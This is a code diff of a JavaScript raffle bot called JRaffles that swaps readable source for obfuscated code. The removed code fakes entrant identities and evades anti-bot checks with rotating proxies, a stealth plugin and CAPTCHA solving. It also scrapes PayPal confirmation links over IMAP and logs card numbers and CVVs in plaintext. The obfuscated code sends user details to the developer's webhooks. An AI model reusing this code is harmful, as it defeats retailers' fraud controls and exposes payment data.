-            .setAuthor({ name: 'JRaffles', iconURL: 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg', url: 'https://twitter.com/JRaffles_' })
-            .setThumbnail(module.logo)
-            .addFields(
-                { name: 'Store', value: `${module.store}`, inline: true },
-                { name: 'Size', value: `${csv.Size}`, inline: true },
-                { name: 'Delay', value: `${settings.delay}`, inline: true }
-            )
-            .addFields({ name: 'URL', value: `||${csv.Url}||` })
-            .setTimestamp()
-            .setFooter({ text: `JRaffles v${version}`, iconURL: 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg' });
-        return embed.data
-    } else if (mode == 'acc' && !isError) {
-        var embed = new EmbedBuilder()
-            .setColor(0xc0d6d6)
-            .setTitle('Account Generated')
-            .setAuthor({ name: 'JRaffles', iconURL: 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg', url: 'https://twitter.com/JRaffles_' })
-            .setThumbnail(module.logo)
-            .addFields(
-                { name: 'User', value: `${username}`, inline: true },
-                { name: 'Store', value: `${module.store}`, inline: true },
-                { name: 'Delay', value: `${settings.delay}`, inline: true }
-            )
-            .setTimestamp()
-            .setFooter({ text: `JRaffles v${version}`, iconURL: 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg' });
-        return embed.data
-    } else if (mode == 'acc' && isError) {
-        var embed = new EmbedBuilder()
-            .setColor(0xc0d6d6)
-            .setTitle('Account Generation Failed')
-            .setAuthor({ name: 'JRaffles', iconURL: 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg', url: 'https://twitter.com/JRaffles_' })
-            .setThumbnail(module.logo)
-            .addFields(
-                { name: 'User', value: `${username}`, inline: true },
-                { name: 'Error', value: `${e}`, inline: true },
-                { name: 'Store', value: `${module.store}`, inline: true },
-                { name: 'Delay', value: `${settings.delay}`, inline: true }
-            )
-            .setTimestamp()
-            .setFooter({ text: `JRaffles v${version}`, iconURL: 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg' });
-        return embed.data
-    } else if (mode == 'open') {
-        var embed = new EmbedBuilder()
-            .setColor(0xc0d6d6)
-            .setTitle('User Opened JRaffles')
-            .setAuthor({ name: 'JRaffles', iconURL: 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg', url: 'https://twitter.com/JRaffles_' })
-            .setThumbnail(avatar)
-            .addFields(
-                { name: 'User', value: `${username}`, inline: true },
-            )
-            .setTimestamp()
-            .setFooter({ text: `JRaffles v${version}`, iconURL: 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg' });
-        return embed.data
-    } else if (!isError && mode == 'ver') {
-        var embed = new EmbedBuilder()
-            .setColor(0xc0d6d6)
-            .setTitle('Successful Verification')
-            .setAuthor({ name: 'JRaffles', iconURL: 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg', url: 'https://twitter.com/JRaffles_' })
-            .setThumbnail(module.logo)
-            .addFields(
-                { name: 'User', value: `${username}`, inline: true },
-                { name: 'Store', value: `${module.store}`, inline: true },
-                { name: 'Delay', value: `${settings.delay}`, inline: true }
-            )
-            .setTimestamp()
-            .setFooter({ text: `JRaffles v${version}`, iconURL: 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg' });
-        return embed.data
-    } else if (isError && mode == 'ver') {
-        var embed = new EmbedBuilder()
-            .setColor(0xc0d6d6)
-            .setTitle('Verification Failed')
-            .setAuthor({ name: 'JRaffles', iconURL: 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg', url: 'https://twitter.com/JRaffles_' })
-            .setThumbnail(module.logo)
-            .addFields(
-                { name: 'User', value: `${username}`, inline: true },
-                { name: 'Error', value: `${e}`, inline: true },
-                { name: 'Store', value: `${module.store}`, inline: true },
-                { name: 'Delay', value: `${settings.delay}`, inline: true }
-            )
-            .setTimestamp()
-            .setFooter({ text: `JRaffles v${version}`, iconURL: 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg' });
-        return embed.data
-    }
+;
+async function _0x2c26c3() {
+    var _0x3fae00 = await _0xab4dc6['get']('Links');
+    return _0x3fae00['Links'];
 }
-
-async function jig(csv, i) {
-    var addressArray = csv[i].Address1.split('');
-    var address2Array = csv[i].Address2.split('');
-    var mailSplit = csv[i].Email.split('@');
-    for (var l = 0; l < addressArray.length; l++) {
-        if (addressArray[l] == 'X') {
-            var pos2 = Math.round(Math.random() * (letters.length - 1));
-            addressArray[l] = lettersArray[pos2];
-        }
-    };
-    for (var l = 0; l < address2Array.length; l++) {
-        if (address2Array[l] == 'X') {
-            var pos2 = Math.round(Math.random() * (letters.length - 1));
-            address2Array[l] = lettersArray[pos2];
-        }
-    };
-    if (csv[i].FirstName.toUpperCase() == 'RANDOM') {
-        csv[i].FirstName = random.first();
+;
+async function _0x534960() {
+    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
+    for (var _0x4eea36 = 0x0; _0x4eea36 < _0x30ecdd['length']; _0x4eea36++) {
+        console['log']('\x20(' + _0x4eea36 + ')\x20' + _0x30ecdd[_0x4eea36]);
     }
-    if (csv[i].LastName.toUpperCase() == 'RANDOM') {
-        csv[i].LastName = random.last();
-    }
-    if (mailSplit[0].toUpperCase() == 'RANDOM') {
-        mailSplit[0] = `${random.first()}${random.last()}${randomIntFromInterval(1, 999)}@`;
-    } else {
-        mailSplit[0] = `${mailSplit[0]}@`
-    }
-    csv[i].Email = mailSplit.join('');
-    csv[i].Address1 = addressArray.join('');
-    csv[i].Address2 = address2Array.join('');
-    if (csv[i].Phone == 'RANDOM') {
-        csv[i].Phone = `0${randomIntFromInterval(100000000, 999999999)}`;
-    }
-    if (csv[i].Follower.toUpperCase() == 'RANDOM') {
-
-        var randomNumbers = randomIntFromInterval(1, 9999);
-        csv[i].Follower = `${random.first()}${random.last()}${randomNumbers} `
-    }
-    if (csv[i].HouseNumber.toUpperCase() == 'RANDOM') {
-        csv[i].HouseNumber = randomIntFromInterval(1, 200);
-    }
-    if (csv[i].Address1.toUpperCase() == 'RANDOM') {
-        var pos3 = Math.round(Math.random() * (letters.length - 1));
-        var randomLetter = lettersArray[pos3];
-        csv[i].Address1 = `${random.last()}straat`;
-        if (csv[i].Zip == '') {
-            csv[i].Postcode = `${randomIntFromInterval(1000, 9999)} ${randomLetter}${randomLetter}`;
-            csv[i].Zip = csv[i].Postcode;
-
-        }
-        csv[i].HouseNumber = `${randomIntFromInterval(1, 200)}`
-    }
-
-    return
-};
-
-async function errorLog(csv, module) {
-    fs.appendFileSync('../failed-tasks.csv', `${getDay()},${module.store},${module.name},${csv.Url},${csv.Size},${csv.Follower},${csv.FirstName},${csv.LastName},${csv.Address1},${csv.Address2},${csv.HouseNumber},${csv.Zip},${csv.City},${csv.State},${csv.Country},${csv.Phone},${csv.Email},${csv.Password},${csv.PaymentMethod},${csv.CardType},${csv.NameOnCard},${csv.CardNumber},${csv.ExpiryDate},${csv.CVV},${csv.IsBillingSame},,,,,,,,,,\n`);
+    ;
+    console['log']();
+    let _0x576b88 = await _0xab4dc6['get']('Product');
+    return console['clear'](), _0x576b88['Product'];
 }
-async function successfulLog(csv, module) {
-    fs.appendFileSync('../successful-tasks.csv', `${getDay()},${module.store},${module.name},${csv.Url},${csv.Size},${csv.Follower},${csv.FirstName},${csv.LastName},${csv.Address1},${csv.Address2},${csv.HouseNumber},${csv.Zip},${csv.City},${csv.State},${csv.Country},${csv.Phone},${csv.Email},${csv.Password},${csv.PaymentMethod},${csv.CardType},${csv.NameOnCard},${csv.CardNumber},${csv.ExpiryDate},${csv.CVV},${csv.IsBillingSame},,,,,,,,,,\n`);
+;
+function _0x3982db() {
+    var _0x4cbbf1 = new Date(Date['now']())['toLocaleTimeString']();
+    return _0x4cbbf1;
 }
-
-function getProxy() {
-    let splitProxies = proxyFile.split("\n");
-    let proxy = splitProxies.map((proxy, index) => {
-        sanatizeProxy = proxy.replace("\r", "");
-        if (splitProxies[index + 1] != undefined) {
-            return `${sanatizeProxy}`;
-        }
-        return `${sanatizeProxy}`;
-    });
-    return proxy;
-};
-
-
-
-
-
-// async function sevenFunction(currentFunction, seven, proxies) {
-//     puppeteer.use(StealthPlugin());
-//     puppeteer.use(RecaptchaPlugin({
-//         provider: {
-//             id: '2captcha',
-//             token: `${settings.captchaKey}`
-//         },
-//         visualFeedback: true
-//     }))
-//     for (var i = 0; i < seven.length; i++) {
-//         setTitle(`${currentFunction.name} Task ${i + 1} / ${seven.length} || File: ${currentFile} Proxies: ${currentProxy}`);
-//         var embed = [
-//             {
-//                 "type": "rich",
-//                 "title": `Succesful SevenStore Entry`,
-//                 "description": "",
-//                 "color": 0xc0d6d6,
-//                 "fields": [
-//                     {
-//                         "name": `User`,
-//                         "value": `${username}`
-//                     },
-//                     {
-//                         "name": `Product`,
-//                         "value": `${seven[i].Url}`
-//                     },
-//                     {
-//                         "name": `Size`,
-//                         "value": `${seven[i].Size}`
-//                     },
-//                     {
-//                         "name": `Delay`,
-//                         "value": `${settings.delay}`
-//                     },
-//                     {
-//                         "name": `Version`,
-//                         "value": `${settings.version}`
-//                     }
-//                 ]
-//             }
-//         ]
-//         const msg = { embeds: embed };
-//         await jig(seven, i);
-//         if (seven[i].Email == '' || seven[i].Password == '' || seven[i].FirstName == '' || seven[i].LastName == '') {
-//             console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Invalid CSV`);
-//             continue;
-//         }
-//         if (seven[i].Password == '' || seven[i].Password == undefined) {
-//             seven[i].Password = 'ErehsaWonRaj1!'
-//         }
-//         if (settings.useRandomProxy = false) {
-//             var proxySplit = proxies[i].split(":");
-//         } else {
-//             var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-//             var proxySplit = proxies[randomProxy].split(":");
-//         }
-//         const browser = await puppeteer.launch({
-//             headless: false,
-//             args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--incognito', '--disable-web-security', '--disable-features=IsolateOrigins', ' --disable-site-isolation-trials',
-//                 '--disable-setuid-sandbox'],
-//         });
-//         try {
-//             const page = await browser.newPage();
-//             await page.authenticate({
-//                 username: `${proxySplit[2]}`,
-//                 password: `${proxySplit[3]}`,
-//             });
-//             console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-//             // await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36')
-//             await page.setRequestInterception(true);
-//             page.on("request", (req) => {
-//                 if (req.resourceType() === "image" || req.resourceType() === "font" || req.resourceType() === "media") {
-//                     req.abort();
-//                 } else {
-//                     req.continue();
-//                 }
-//             });
-//             // await page.minimize();
-//             await page.setViewport({ width: 1280, height: 720 });
-//             await page.goto(`${seven[i].Url}`, { waitUntil: "networkidle2", timeout: 120000 });
-//             await page.waitForSelector('#btnPdpAtb')
-//             console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Choosing size ${seven[i].Size}`);
-//             const sizes = await page.$$eval('div.pointer.pdpsizeoption.f-12.f-color3', sizes => {
-//                 return sizes.map(size => size.innerText)
-//             })
-//             const sizeButtons = await page.$$('div.pointer.pdpsizeoption.f-12.f-color3');
-//             const sizeError = false;
-//             if (seven[i].Size == 'RANDOM') {
-//                 var randomSize = Math.round(Math.random() * (sizeButtons.length - 1));
-//                 await sizeButtons[randomSize].click();
-//             } else {
-//                 for (var s = 0; s < sizes.length; s++) {
-//                     if (sizes[s] != seven[i].Size) {
-//                         continue;
-//                     }
-//                     try {
-//                         await sizeButtons[s].click();
-//                     } catch {
-//                         console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Size Not Found`));
-//                         sizeError = true;
-//                     }
-//                 }
-//             }
-//             if (sizeError) {
-//                 continue;
-//             }
-//             await delay(1400);
-//             await page.click('#btnPdpAtb');
-//             await page.waitForSelector('.fa.fa-check-circle.f-color8.f-30.valign-middle-important');
-//             await delay(1000);
-//             console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Checkout Session`);
-//             await page.goto('https://www.sevenstore.com/login/?target=checkout');
-//             await page.waitForSelector('#email');
-//             await page.type('#email', seven[i].Email);
-//             await delay(550);
-//             // await page.click('#guest-submit');
-//             await page.click('#guest-submit');
-//             await delay(7000);
-//             // await page.screenshot({ path: 'screen.png' })
-//             console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Filling Information`);
-//             await page.waitForSelector('#firstname');
-//             await page.type('#firstname', seven[i].FirstName, 500);
-//             await delay(400);
-//             await page.waitForSelector('#surname');
-//             await page.type('#surname', seven[i].LastName, 500);
-//             await delay(400);
-//             await page.waitForSelector('#mobile');
-//             await page.type('#mobile', seven[i].Phone, 500);
-//             await delay(400);
-//             await page.click('#enterManualDiv');
-//             await delay(1500);
-//             await page.waitForSelector('#address1');
-//             await page.type('#address1', `${seven[i].Address1} ${seven[i].HouseNumber}`, 550);
-//             await delay(900);
-//             await page.waitForSelector('#address2');
-//             await page.type('#address2', `${seven[i].Address2}`, 550);
-//             await delay(800);
-//             const countries = await page.$$eval('#countryselect_view3 > option', sizes => {
-//                 return sizes.map(size => size.value)
-//             })
-//             var country;
-//             for (var c = 0; c < countries.length; c++) {
-//                 if (countries[c].startsWith(`${seven[i].Country}`)) {
-//                     country = countries[c]
-//                     break;
-//                 }
-//                 continue
-//             }
-//             // console.log(country);
-//             await page.select('#countryselect_view3', `${country}`)
-//             await page.waitForSelector('#address4');
-//             await page.type('#address4', `${seven[i].City}`, 500);
-//             await delay(900);
-//             await page.waitForSelector('#postcode');
-//             await page.type('#postcode', `${seven[i].Zip}`, 500);
-//             await delay(1200);
-//             const url = await page.url();
-//             console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Submitting Entry`);
-//             // console.log(url);
-//             const session = url.split('?')[1];
-//             const submit = await page.$('#co_address_submit');
-//             await submit.evaluate(submit => submit.click());
-//             await delay(5000);
-//             await page.goto(`https://www.sevenstore.com/checkout/pay/?${session}`);
-//             // await page.click('#co_address_submit');
-//             // await page.click('#co_address_submit');
-//             // await page.waitForSelector('#proceed-to-pay');
-//             console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Payment session`);
-//             await page.waitForSelector('#paymentbuttons');
-//             await delay(5000);
-//             await page.click('#paymentbuttons > div');
-//             await delay(450);
-//             await page.waitForSelector('#card-number');
-//             await page.waitForSelector('#card-number > div > iframe');
-
-//             // await page.click('#card-number');
-//             // console.log('waiting for iframe with form to be ready.');
-//             // await page.waitForSelector('iframe');
-//             // console.log('iframe is ready. Loading iframe content');
-
-//             const elementHandle = await page.$(
-//                 '#card-number > div > iframe',
-//             );
-//             const frame = await elementHandle.contentFrame();
-//             await frame.waitForSelector('.InputContainer');
-//             await frame.click('.InputContainer > input')
-//             await delay(1400)
-//             await page.type('#card-number', `${seven[i].CreditNumber}`);
-//             await delay(250);
-//             // await page.click('#card-expiry');
-//             await page.type('#card-expiry', `${seven[i].ExpiryDate}`);
-//             await delay(250);
-
-//             // await page.click('#card-cvc');
-//             await page.type('#card-cvc', `${seven[i].CVV}`);
-//             // console.log('vatteeeee')
-//             await delay(2000);
-//             await page.click('#card-button');
-//             console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Awaiting 3DS`);
-
-//             // await page.click('.f-15');
-//             // await page.click('#paymentsection-paypal > a');
-//             // await delay(7000);
-//             // const paypalLink = await page.url();
-//             // // console.log(paypalLink);
-//             try {
-//                 await page.waitForSelector('.btn-auxilliary.btn-sub.fullwidth', { timeout: 300000 });
-//                 console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Raffle Entered!`));
-//                 await sendWebhook(succesWH, msg);
-//             } catch {
-//                 console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : 3DS Failed`));
-//                 embed[0].title = 'Failed Seven Entry';
-//                 embed[0].description = `3DS Failed`;
-//                 await sendWebhook(errorWH, msg);
-//             }
-
-//         } catch (e) {
-//             console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${e}`));
-//             embed[0].title = 'Failed Seven Entry';
-//             embed[0].description = `${e}`;
-//             await sendWebhook(errorWH, msg);
-//         } finally {
-//             if (browser) {
-//                 browser.close();
-//             }
-//             if (i + 1 == seven.length) {
-//                 console.log(chalk.green(`Finished tasks, returning to Main Menu`))
-//                 await delay(2000);
-//                 break;
-//             }
-//             console.log(`Waiting for ${settings.AfewDelay} ms`);
-//             await delay(settings.AfewDelay);
-//         }
-//     }
-// }
-
-// async function oqiumFunction(i, mode, currentFunction, oqium, proxies) {
-//     var ERROR;
-//     var data = {};
-//     var embed = [];
-//     var msg = {};
-//     var sizeArray = [
-//         '40', '40,5', '41', '42', '42,5', '43', '44', '45', '45,5', '46', '47', '47,5', '48'
-//     ]
-//     if (!oqium) {
-//         oqium = {
-
-//         };
-//     }
-//     if (mode != 'ver') {
-//         setTitle(`${currentFunction.name} Task ${i + 1} / ${oqium.length} || File: ${currentFile} Proxies: ${currentProxy}`);
-//         await jig(oqium, i);
-//         embed = [
-//             {
-//                 "type": "rich",
-//                 "title": `Succesful OQIUM Entry`,
-//                 "description": "",
-//                 "color": 0xc0d6d6,
-//                 "fields": [
-//                     {
-//                         "name": `User`,
-//                         "value": `${username}`
-//                     },
-//                     {
-//                         "name": `Size`,
-//                         "value": `${oqium[i].Size}`
-//                     },
-//                     {
-//                         "name": `Delay`,
-//                         "value": `${settings.delay}`
-//                     },
-//                     {
-//                         "name": `Version`,
-//                         "value": `${version}`
-//                     }
-//                 ]
-//             }
-//         ]
-//         msg = { embeds: embed };
-
-
-//         data = currentFunction.data;
-
-//         if (mode == 'exp') {
-//             data.data.attributes.email = `${oqium[i].FirstName}${oqium[i].LastName}${settings.catchall}`;
-//         } else {
-//             data.data.attributes.email = `${oqium[i].Email}`;
-//         }
-//         if (oqium[i].Size == 'RANDOM') {
-
-//         }
-
-//         data.data.attributes.properties.$first_name = `${oqium[i].FirstName}`;
-//         data.data.attributes.properties.$last_name = `${oqium[i].LastName}`;
-//         data.data.attributes.properties.$address1 = `${oqium[i].Address1} ${oqium[i].Address2} ${oqium[i].HouseNumber}`;
-//         data.data.attributes.properties.$zip = `${oqium[i].Zip}`;
-//         data.data.attributes.properties.$city = `${oqium[i].City}`;
-//         data.data.attributes.properties.$country = `${oqium[i].Country}`;
-//         data.data.attributes.properties.Size = `${oqium[i].Size}`;
-//         data.data.attributes.properties.$phone_number = `${oqium[i].Phone}`;
-//         data.data.attributes.properties['Instagram Account'] = `${oqium[i].Follower}`;
-//     }
-
-//     if (settings.useRandomProxy = false) {
-//         var proxySplit = proxies[i].split(":");
-//     } else {
-//         var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-//         var proxySplit = proxies[randomProxy].split(":");
-//     }
-
-
-
-//     var options = {
-//         jar: j,
-//         followAllRedirects: true,
-//         method: 'POST',
-//         url: currentFunction.url,
-//         headers: currentFunction.headers,
-//         body: JSON.stringify(data),
-//         proxy: `http://${proxySplit[2]}:${proxySplit[3]}@${proxySplit[0]}:${proxySplit[1]}`,
-//     };
-//     if (mode != 'ver') {
-//         options.url = currentFunction.url
-//         options.headers = currentFunction.headers
-//     }
-//     if (mode == 'ver') {
-//         options.method = 'GET';
-//     }
-//     return new Promise(function (resolve, reject) {
-//         callback = async (err, res, body) => {
-//             if (!err && res.statusCode == 202 || !err && res.statusCode == 200) {
-//                 if (mode != 'ver') {
-//                     var succesDEV = await makeEmbed(oqium[i], currentFunction, 'dev', false);
-//                     var succesPUB = await makeEmbed(oqium[i], currentFunction, 'pub', false);
-//                     const EMBEDS =
-//                     {
-//                         succesDEVMSG: { embeds: [succesDEV] },
-//                         succesPUBMSG: { embeds: [succesPUB] }
-//                     };
-
-//                     if (settings.webhook != undefined && settings.webhook != '') {
-//                         try {
-
-//                             await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-//                         } catch {
-
-//                         }
-//                     }
-//                     await delay(200);
-//                     await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-//                     await delay(200);
-//                     try {
-
-//                         await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
-//                     } catch {
-
-//                     }
-//                     successfulLog(oqium[i], currentFunction);
-//                 }
-
-//                 resolve(console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1}: Raffle Entered!`)));
-//             } else {
-//                 if (mode != 'ver') {
-//                     var ERROR = `${err}`;
-//                     var errorDEV = await makeEmbed(oqium[i], currentFunction, 'dev', true, ERROR);
-//                     var EMBEDS = {}
-//                     EMBEDS.errorDEV = { embeds: [errorDEV] }
-//                     errorLog(oqium[i], currentFunction)
-
-//                     if (settings.webhook != undefined && settings.webhook != '') {
-//                         await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-//                     }
-//                     await sendWebhook(errorWH, EMBEDS.errorDEV);
-
-//                 }
-//                 reject(console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1}: ${err}`));
-//             }
-//         }
-//         try {
-//             if (mode != 'ver') {
-//                 console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1}: Sending Entry for ${data.data.attributes.email}`)
-//             }
-//             request(options, callback);
-//         } catch (err) {
-//             console.log(`${getTime()} Task ${i + 1}: ${err}`);
-//         }
-//     });
-// };
-
-
-
-async function paypalFunction(currentFunction, proxies) {
-    if (retry != 'yes') {
-        var retry = '';
-        var t = 0;
-
+;
+function _0x1f2aee() {
+    var _0x12ebd0 = new Date(Date['now']())['toLocaleString']();
+    return _0x12ebd0['replace'](',', '');
+}
+async function _0x3c7bbe(_0x3bade4, _0x4f06b8) {
+    let _0x2565bd = { 'headers': { 'content-type': 'application/json' } };
+    if (_0x3b2d4c != 'devkey') {
+        await _0x5d1b21['post'](_0x3bade4, _0x4f06b8, _0x2565bd);
+        return;
     }
-    async function choosePaypal() {
-        var accountFile = fs.readFileSync(`../accounts/paypal.csv`, 'utf-8');
-        let accounts = Papa.parse(accountFile, { header: true }).data;
-        console.log('Choose a Paypal to use:\n');
-        for (var i = 0; i < accounts.length; i++) {
-            console.log(`(${i}) ${accounts[i].Email}`);
-        }
-        console.log(`\n(${accounts.length}) ${chalk.cyan('Add a new account')}`);
-        let choice = await prompt.get('Option');
-        // console.log(choice.Option);
-        // console.log(accounts[choice.Option]);
-        if (choice.Option < accounts.length) {
-            // await delay(10000)
-            return accounts[choice.Option];
-        }
-        console.clear();
-        console.log("Adding a new account\nEnter your paypal's email:\n");
-        let acc = {};
-        let Email = await prompt.get('Email');
-        acc.Email = Email.Email;
-        var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-        acc.Proxy = proxies[randomProxy];
-        console.clear();
-        console.log("Enter your paypal's password:\n");
-        let Password = await prompt.get('Password');
-        acc.Password = Password.Password;
-        fs.appendFileSync('../accounts/paypal.csv', `\n${acc.Email},${acc.Password},${acc.Proxy}`);
-        return acc;
-
-    }
-    let paypalAccount = await choosePaypal();
-    // console.log(paypalAccount);
-    var links = [];
-    // await delay(10000)
-    // console.log(`Found ${links.length} Links in Mailbox`)
-    console.clear();
-    console.log('How many links would you like to verify on this paypal?')
-    let messagePrompt = await prompt.get('Amount');
-    let MAX_MESSAGES_TO_FETCH = messagePrompt.Amount;
-    async function getMails() {
-        let numMessagesProcessed = 0;
-        var imap = new Imap({
-            user: settings.masterMail,
-            password: settings.masterPassword,
-            host: 'imap.gmail.com',
-            port: 993,
-            tls: true,
-            autotls: 'always'
+    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
+}
+;
+async function _0x2520f4(_0x526497, _0x2662c3, _0x29f882, _0x28f60f, _0x3a020e) {
+    if (!_0x28f60f && _0x29f882 == 'dev') {
+        var _0x2f59da = new _0x3de3a3()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
+            'name': 'JRaffles',
+            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
+            'url': 'https://twitter.com/JRaffles_'
+        })['setThumbnail'](_0x2662c3['logo'])['addFields']({
+            'name': 'Store',
+            'value': '' + _0x2662c3['store'],
+            'inline': !![]
+        })['addFields']({
+            'name': 'Size',
+            'value': '' + _0x526497['Size'],
+            'inline': !![]
+        })['addFields']({
+            'name': 'Delay',
+            'value': '' + _0x51d52a['delay'],
+            'inline': !![]
+        })['addFields']({
+            'name': 'User',
+            'value': '' + _0x358285,
+            'inline': !![]
+        })['addFields']({
+            'name': 'URL',
+            'value': '' + _0x526497['Url'],
+            'inline': !![]
+        })['addFields']({
+            'name': 'Mail',
+            'value': '' + _0x526497['Email'],
+            'inline': !![]
+        })['setTimestamp']()['setFooter']({
+            'text': 'JRaffles\x20v' + _0x3b2d4c,
+            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
         });
-
-        function openInbox(cb) {
-            imap.openBox('INBOX', false, cb);
-        }
-
-        imap.once('ready', function () {
-            openInbox(function (err, box) {
-                console.clear()
-                console.log('Looking For Links')
-                if (err) throw err;
-                imap.seq.search(['UNSEEN', ['SUBJECT', 'PayPal']], function (err, results) {
-                    if (!results || !results.length) {
-                        console.log(`${getTime()} [${currentFunction}] No mails found`);
-
-                        imap.end();
-
-                    } else {
-
-                        results = results.slice(0, MAX_MESSAGES_TO_FETCH);
-                        var f = imap.seq.fetch(results, { bodies: '', markSeen: true });
-                        f.on('message', function (msg, seqno) {
-                            // console.log('Message #%d', seqno);
-                            // if (numMessagesProcessed >= MAX_MESSAGES_TO_FETCH) {
-                            //     // Stop processing messages after the first 5 have been processed
-                            //     f.emit('end');
-                            //     return;
-                            // }
-                            var prefix = '(#' + seqno + ') ';
-                            msg.on('body', function (stream, info) {
-                                simpleParser(stream, (err, mail) => {
-                                    if (mail.subject == 'PayPal Konto bestätigen' || mail.subject == 'Confirm your PayPal account') {
-                                        mes = mail.text.split('[')[2]
-                                        var link = mes.split(']')[0];
-                                        links.push(link)
-
-
-                                    }
-                                    // console.log(mail.html.split('\n'));
-                                    // mes = mail.text.split('[')[2]
-                                    // link = mes.split(']')[0];
-                                    // console.log(link);
-                                });
-                                // imap.seq.setFlags(seqno, 'SEEN')
-
-
-                            });
-                            // msg.once('attributes', function (attrs) {
-                            //     console.log(prefix + 'Attributes: %s', inspect(attrs, false, 8));
-                            // });
-                            msg.once('end', function () {
-                                // console.log(prefix + 'Finished');
-                                numMessagesProcessed++;
-
-                            });
-                        });
-                        f.once('error', function (err) {
-                            console.log('Fetch error: ' + err);
-                        });
-                        f.once('end', function () {
-                            // console.log('Done fetching all messages!');
-                            imap.end();
-                        });
-
-                    }
-                })
+        return _0x2f59da['data'];
+    } else {
+        if (_0x28f60f && _0x29f882 == 'dev') {
+            var _0x2f59da = new _0x3de3a3()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
+                'name': 'JRaffles',
+                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
+                'url': 'https://twitter.com/JRaffles_'
+            })['setThumbnail'](_0x2662c3['logo'])['addFields']({
+                'name': 'User',
+                'value': '' + _0x358285,
+                'inline': !![]
+            }, {
+                'name': 'Store',
+                'value': '' + _0x2662c3['store'],
+                'inline': !![]
+            }, {
+                'name': 'Size',
+                'value': '' + _0x526497['Size'],
+                'inline': !![]
+            }, {
+                'name': 'Delay',
+                'value': '' + _0x51d52a['delay'],
+                'inline': !![]
+            })['addFields']({
+                'name': 'ERROR',
+                'value': '' + _0x3a020e,
+                'inline': !![]
+            })['addFields']({
+                'name': 'URL',
+                'value': '' + _0x526497['Url']
+            })['addFields']({
+                'name': 'Mail',
+                'value': '' + _0x526497['Email'],
+                'inline': !![]
+            })['setTimestamp']()['setFooter']({
+                'text': 'JRaffles\x20v' + _0x3b2d4c,
+                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
             });
-        });
-
-
-
-        imap.once('error', function (err) {
-            console.log(chalk.red(err.message))
-            console.log('Read the guide on how to setup your mailbox')
-        });
-
-        imap.once('end', async function () {
-
-
-            // console.log('Connection ended');
-        });
-
-        imap.connect();
-    }
-
-    try {
-        getMails();
-        await delay(4000);
-        console.log(`Found ${links.length} Links in Mailbox`)
-
-    } catch {
-        console.log(`Searching mailbox failed, please read the guide on how to setup..`)
-        await delay(4000);
-    }
-
-
-    var loginCookies;
-    setTitle(`${currentFunction}`);
-    // puppeteer.use(StealthPlugin());
-    // if (settings.useRandomProxy = false) {
-    //     var proxySplit = proxies[i].split(":");
-    // } else {
-    //     var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-    //     var proxySplit = proxies[randomProxy].split(":");
-    // }
-    var proxySplit = paypalAccount.Proxy.split(":");
-    var browser;
-    try {
-        browser = await puppeteer.launch({
-            userDataDir: `sessions/${paypalAccount.Email}`,
-            executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-            headless: false,
-            args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-        });
-
-    } catch {
-        browser = await puppeteer.launch({
-            userDataDir: `sessions/${paypalAccount.Email}`,
-            executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-            headless: false,
-            args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-        });
-    }
-    try {
